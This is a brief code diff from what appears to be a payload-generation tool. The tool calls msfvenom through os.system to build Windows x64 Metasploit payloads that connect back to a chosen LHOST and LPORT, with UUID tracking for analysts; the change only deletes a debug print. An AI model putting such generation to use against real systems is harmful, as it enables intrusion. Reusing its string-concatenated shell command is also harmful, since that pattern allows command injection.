@@ -32,8 +32,6 @@ class Generator():
         else:
             os.system("msfvenom -a x64 --platform windows -p " + payload.replace('windows/', 'windows/x64/') + " PayloadUUIDTracking=true PayloadUUIDName=" +
                       uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
-            print("msfvenom -a x64 --platform windows -p " + payload.replace('windows/', 'windows/x64/') + " PayloadUUIDTracking=true PayloadUUIDName=" +
-                      uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
             self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
         with open("/tmp/metasploit", 'rb') as f:
